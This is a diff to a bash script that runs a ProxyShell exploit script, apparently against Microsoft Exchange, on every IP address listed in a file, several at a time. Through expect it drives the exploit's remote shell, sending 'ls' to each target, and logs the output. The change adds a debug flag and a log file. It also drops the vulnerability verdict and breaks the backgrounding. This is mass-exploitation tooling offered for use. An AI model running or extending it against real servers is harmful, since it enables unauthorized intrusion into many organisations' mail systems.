@@ -4,7 +4,7 @@
 
 # Check if the servers file argument is provided
 if [ $# -eq 0 ]; then
-    echo "Usage: $0 <servers_file>"
+    echo "Usage: $0 [--debug] <servers_file>"
     exit 1
 fi
 
@@ -12,6 +12,14 @@ fi
 MAX_PARALLEL=5
 # Array to hold PIDs
 PIDS=()
+
+debug=false
+
+# Check for --debug flag
+if [ "$1" = "--debug" ]; then
+    debug=true
+    shift
+fi
 
 servers_file="$1"
 
@@ -21,25 +29,24 @@ if [ ! -f "$servers_file" ]; then
     exit 1
 fi
 
+log_file="${servers_file%.txt}_log.txt"  # Creating the log file name
+
 # Read IP addresses from the file and iterate
 while IFS= read -r ip; do
     (
-        output=$(expect -c "
-            spawn python3 exchange_proxyshell.py -u https://$ip
-            expect -re \".*\" { send \"ls\n\" }
-            interact
-        " 2>&1)
-        
-        if ! echo "$output" | grep -qE "[-] Not vulnerable!"; then
-            if ! echo "$output" | grep -qE "User has insufficient permissions|Connection reset by peer"; then
-                echo "IP: $ip - Not vulnerable"
-            else
-                echo "IP: $ip - Vulnerable"
-            fi
+        if [ "$debug" = true ]; then
+            python3 exchange_proxyshell.py -u "https://$ip"
         else
-            echo "IP: $ip - Vulnerable"
+            output=$(expect -c "
+                spawn python3 exchange_proxyshell.py -u https://$ip
+                expect -re \".*\" { send \"\r\"; exp_continue }
+                expect -re \".*\" { send \"ls\n\"; exp_continue }
+                interact
+            " 2>&1)
+            echo "$output" >> "$log_file"  # Append Python output to the log file
         fi
-    ) &
+        echo "IP: $ip"
+    ) | tee -a "$log_file"
     
     # Store the PID of the background process
     PIDS+=($!)
